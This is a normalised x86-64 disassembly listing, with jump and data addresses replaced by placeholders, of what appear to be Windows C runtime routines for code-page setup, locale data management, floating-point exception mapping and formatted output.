mov [ rdx ] si
add rdx 0x2
sub r15 r8
mov [ rbp - 0x70 ] rdx
jmp r-xdata
mov r15d [ rsp + 0x30 ]
mov eax 0x30
mov esi eax
mov [ rsp + 0x38 ] eax
mov rdx r13
movzx ecx si
call sub_180027040
mov r14d 0x6f
sub edi r15d
mov [ rsp + 0x54 ] edi
jne r-xdata
add r10 0x2
cmp si cx
jne r-xdata
mov esi [ rsp + 0x38 ]
movzx eax [ r10 ]
cmp dx ax
je r-xdata
cmp r14d eax
je r-xdata
movzx eax si
mov ecx 0x1
add [ rsp + 0x58 ] ecx
lea ebx [ rbx + rax - 0x30 ]
mov [ rsp + 0x4c ] ebx
cmp [ rsp + 0x5c ] edi
je r-xdata
shl ebx 0x3
jmp r-xdata
cmp r14d eax
je r-xdata
movzx eax si
mov ecx 0x1
add [ rsp + 0x58 ] ecx
sub eax 0x30
cdqe
add rbx rax
mov [ rbp - 0x60 ] rbx
cmp [ rsp + 0x5c ] edi
je r-xdata
shl rbx 0x3
jmp r-xdata
test ebx ebx
je r-xdata
mov rdx r13
movzx ecx si
call sub_180027040
mov eax 0x1
mov eax r12d
sub r12d ecx
test eax eax
je r-xdata
lea eax [ rdx - 0x20 ]
cmp ax si
jne r-xdata
jmp r-xdata
mov rcx r13
add r15d ebx
call sub_180026e44
movzx esi ax
mov eax 0xff00
mov [ rsp + 0x38 ] esi
test ax si
je r-xdata
mov [ rax ] r14b
jmp r-xdata
mov [ rax ] r14w
jmp r-xdata
mov rbx [ rsp + 0x68 ]
jmp r-xdata
movsxd rax [ rsp + 0x4c ]
mov ecx [ rsp + 0x30 ]
xor edx edx
lea r8d [ rdx + 0x1 ]
test eax eax
jle r-xdata
xor edx edx
add bl r15b
add r10 0x2
mov [ rsp + 0x70 ] r10
cmp r13w ax
jae r-xdata
cmp [ rsp + 0x34 ] r14b
jne r-xdata
mov rax [ rbp - 0x78 ]
lea r9 [ rbp - 0x10 ]
lea r8 [ rbp - 0x78 ]
mov [ rax + rdi * 2 ] dx
add rdi rcx
lea rax [ rbp - 0x68 ]
lea rdx [ rbp - 0x58 ]
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_180021b30
test eax eax
je r-xdata
mov eax 0xff00
test ax si
je r-xdata
movzx eax si
movzx ecx al
call sub_180026d40
test eax eax
je r-xdata
add [ rbp - 0x70 ] rax
sub r15 rax
jmp r-xdata
movzx r9d r13w
movzx r13d ax
movzx r9d ax
jmp r-xdata
mov r13d [ rsp + 0x78 ]
mov r12 [ rbp - 0x78 ]
add r13d eax
mov rax [ rbp - 0x58 ]
mov [ r12 + rdi * 2 ] r14w
lea rbx [ rax + rax + 0x2 ]
mov [ rsp + 0x78 ] r13d
mov rcx rbx
call sub_180020800
mov rdi rax
test rax rax
je r-xdata
mov rcx r13
inc r15d
call sub_180026e44
mov ecx 0x2d
movzx esi ax
mov [ rsp + 0x38 ] esi
cmp cx ax
jne r-xdata
movzx eax si
movzx ecx al
call sub_180026d40
test eax eax
je r-xdata
mov rcx rbx
movzx r8d r9w
movzx eax r9w
mov edx r11d
mov r9d 0x1
movzx r13d r12w
jmp r-xdata
movzx r10d r13w
mov r11d 0x1
cmp r13w r9w
jae r-xdata
lea rax [ rbx - 0x1 ]
mov r9 r12
mov r8 rbx
mov rdx rdi
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_18002789c
test eax eax
je r-xdata
mov eax 0x2b
cmp ax si
jne r-xdata
mov rax [ rbp - 0x78 ]
lea r9 [ rbp - 0x10 ]
lea r8 [ rbp - 0x78 ]
mov [ rax + rdi * 2 ] cx
lea rax [ rbp - 0x68 ]
inc rdi
lea rdx [ rbp - 0x58 ]
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_180021b30
test eax eax
je r-xdata
mov eax r12d
sub r12d ebx
test eax eax
je r-xdata
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ r8 + rbx ] dl
movzx ecx [ r10 ]
mov edx 0x5d
cmp dx cx
jne r-xdata
movzx ecx r13w
mov r8 r10
mov edx r11d
and ecx 0x7
shr r8 0x3
add r13w r11w
shl dl cl
add r10 r11
or [ r8 + rbx ] dl
cmp r13w r9w
jb r-xdata
mov r10 [ rsp + 0x70 ]
mov rcx [ rw-data ]
movsx ebx [ rsp + 0x35 ]
call [ DecodePointer@IAT ]
mov rdx [ rbp - 0x70 ]
lea r9 [ rbp - 0x38 ]
lea ecx [ rbx - 0x1 ]
mov r8 rdi
call rax
mov rcx rdi
call sub_18001c80c
jmp r-xdata
cmp eax 0x16
je r-xdata
mov eax 0xff00
test ax si
je r-xdata
mov eax r12d
mov ecx 0x1
sub r12d ecx
test eax eax
jne r-xdata
jmp r-xdata
mov rax [ rbp - 0x78 ]
add [ rsp + 0x58 ] ebx
lea r9 [ rbp - 0x10 ]
mov [ rax + rdi * 2 ] si
lea rax [ rbp - 0x68 ]
add rdi rbx
lea r8 [ rbp - 0x78 ]
lea rdx [ rbp - 0x58 ]
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_180021b30
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r14
call sub_18002073c
int3
cmp eax 0x22
je r-xdata
movzx eax si
movzx ecx al
call sub_180026d40
test eax eax
je r-xdata
add r15d ecx
jmp r-xdata
mov r12d r14d
jmp r-xdata
mov rcx r13
add r15d ebx
call sub_180026e44
movzx esi ax
mov [ rsp + 0x38 ] esi
mov eax r12d
mov ecx 0x1
sub r12d ecx
test eax eax
je r-xdata
mov rcx r13
call sub_180026e44
movzx esi ax
mov [ rsp + 0x38 ] esi
mov rax [ rbp - 0x78 ]
add ebx ecx
lea r9 [ rbp - 0x10 ]
mov [ rax + rdi * 2 ] si
add rdi rcx
lea rax [ rbp - 0x68 ]
lea r8 [ rbp - 0x78 ]
lea rdx [ rbp - 0x58 ]
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_180021b30
test eax eax
je r-xdata
inc r15d
sub_180022f9c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_18001eb88
xor r9d r9d
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rdx [ rax + 0xa0 ]
mov rcx rdx
lea rax [ rdx + 0xc0 ]
cmp rcx rax
jae r-xdata
lea rax [ rdx + 0xc0 ]
add rcx 0x10
cmp rcx rax
jb r-xdata
mov rcx r9
cmp [ rcx ] edi
je r-xdata
cmp [ rcx ] edi
je r-xdata
mov r8 [ rcx + 0x8 ]
test r8 r8
je r-xdata
test rcx rcx
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rcx + 0x8 ] r9
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
cmp [ rcx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r9
mov ecx [ rcx + 0x4 ]
call r8
mov edx 0x30
mov rax [ rbx + 0xa0 ]
add rdx 0x10
mov [ rdx + rax - 0x8 ] r9
cmp rdx 0xc0
jl r-xdata
cmp [ rcx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
cmp [ rcx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
cmp [ rcx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rcx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rcx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rcx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rcx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
cmp [ rcx ] 0xc00002b5
jne r-xdata
mov [ rbx + 0xb0 ] 0x8a
jmp r-xdata
cmp [ rcx ] 0xc00002b4
mov eax edi
mov edx 0x8e
cmove eax edx
mov [ rbx + 0xb0 ] eax
mov [ rbx + 0xb0 ] 0x8d
jmp r-xdata
sub_180023180
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8d esi
xor edx edx
call sub_18001c9f0
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0xc ] r11d
mov [ rbp + 0x4 ] r11
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
dec rsi
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
dec rdx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18002320c
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push rbp
lea rbp [ rax - 0x488 ]
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x470 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rcx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rcx ] al
inc eax
inc rcx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rbp + 0x470 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x270 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_180027d80
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x70 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_180027b88
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_180027b88
lea rdx [ rbp + 0x70 ]
lea r8 [ rbp + 0x170 ]
sub rdx rsi
lea r11 [ rbp + 0x270 ]
lea rcx [ rsi + 0x1d ]
sub r8 rsi
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov eax r8d
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_18001c9f0
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rdx + rcx - 0x1d ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ r8 + rcx - 0x1d ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
add r11 0x2
dec rbx
jne r-xdata
sub_1800233fc
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_18001ec0c
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_1800259a4
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_1800258a4
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_180020dcc
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ]
mov rbx [ rsp + 0x30 ]
[ rbx ]
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_18001c80c
sub_1800234b8
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18001db70
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180023548
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_1800234b8
xor ebx ebx
mov edi eax
test eax eax
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_180023180
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_18001c9f0
lea r10 [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
shl r10 0x4
mov ebp 0x4
lea r8 [ r10 + r13 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub rbp r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi + rcx ]
mov [ rcx ] ax
add rcx 0x2
sub rdx r12
jne r-xdata
mov rcx rsi
call sub_18002320c
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
sub r10 rsi
mov [ rsi + 0xc ] ebx
lea rcx [ rsi + 0x10 ]
lea rdi [ r10 + r13 - 0xc ]
mov edx 0x6
mov ebx 0x412
jmp r-xdata
dec edi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_18001c9f0
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
dec ecx
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_1800237c0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_18001ec0c
mov rsi rax
call sub_1800233fc
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_1800234b8
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_180020800
mov rbx rax
xor edi edi
test rax rax
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_18001c4a0
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_180023548
mov r13d eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
[ rcx ]
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ]
test [ rsi + 0xc8 ] 0x2
jne r-xdata
mov rcx [ rsi + 0xb8 ]
cmp rcx r12
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_18001c80c
test [ rw-data ] 0x1
jne r-xdata
call sub_18001c80c
mov esi 0xd
mov ecx esi
call sub_1800259a4
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
lea r8 [ __dos_header ]
mov edx edi
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x50540 ] ax
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
cmp edi 0x100
jge r-xdata
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x4e090 ] al
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ]
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0x4e1a0 ] al
inc edi
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ]
mov ecx esi
call sub_1800258a4
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
call sub_18001c80c
sub_1800239c8
[ rcx ]
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ]
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ]
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ]
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ]
retn
[ rdx ]
sub_180023a54
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_180023af8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_18001c80c
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_18001c80c
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_18001c80c
mov rcx [ rbx + 0x130 ]
call sub_18001c80c
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_180027e00
mov rcx [ rbx + 0x158 ]
call sub_18001c80c
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
dec rsi
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18001c80c
cmp [ rcx ] 0x0
jne r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x110 ]
call sub_18001c80c
mov rcx [ rbx + 0x128 ]
call sub_18001c80c
cmp [ rcx ] 0x0
jne r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x128 ]
call sub_18002825c
call sub_18001c80c
call sub_18001c80c
mov rcx [ rbx + 0x128 ]
call sub_1800281f0
sub_180023c74
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_1800239c8
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_180023a54
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_180023af8
sub_180023ccc
push rbx
sub rsp 0x20
call sub_18001ec0c
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_1800259a4
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_180023c74
mov rbx rax
mov ecx 0xc
call sub_1800258a4
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_180020dcc
call sub_18001ec0c
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_180023d44
mov [ rsp + 0x8 ] cx
push rbx
sub rsp 0x20
mov eax 0xffff
movzx ebx dx
cmp cx ax
jne r-xdata
mov eax 0x100
cmp cx ax
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx 0x1
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x30 ]
mov r8d ecx
call [ GetStringTypeW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
mov rax [ rw-data ]
movzx ecx cx
movzx eax [ rax + rcx * 2 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
movzx eax cx
movzx ecx [ rsp + 0x40 ]
movzx ecx bx
and eax ecx
sub_180023dac
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
call sub_180026918
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
inc [ rbx ]
or [ rbx ] 0xffffffff
jmp r-xdata
inc [ r8 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180023de4
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
movzx ebp cx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
movzx ecx bp
dec ebx
call sub_180023dac
cmp [ rdi ] 0xffffffff
je r-xdata
sub_180023e38
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x3e0 ]
sub rsp 0x4e0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3d0 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x78 ] rcx
mov [ rbp - 0x80 ] rdx
lea rcx [ rbp - 0x70 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x50 ] r9
mov [ rsp + 0x70 ] eax
mov r12d eax
mov [ rsp + 0x58 ] eax
mov edi eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x6c ] eax
mov [ rsp + 0x44 ] eax
call sub_18001db70
call sub_18001e6e4
xor r10d r10d
mov [ rbp - 0x48 ] rax
test rbx rbx
jne r-xdata
mov r8 [ rbp - 0x80 ]
test r8 r8
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
xor r11d r11d
cmp [ rbp - 0x58 ] r11b
je r-xdata
movzx r13d [ r8 ]
mov edx r10d
mov r15d r10d
mov r9d r10d
mov [ rbp - 0x50 ] r10
mov [ rsp + 0x40 ] edx
test r13w r13w
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x58 ] r10b
je r-xdata
mov rbx [ rbp - 0x40 ]
or esi 0xffffffff
lea ecx [ rsi + 0x59 ]
lea r11d [ rsi + 0x21 ]
mov rcx [ rbp + 0x3d0 ]
xor rcx rsp
call sub_18001d1f0
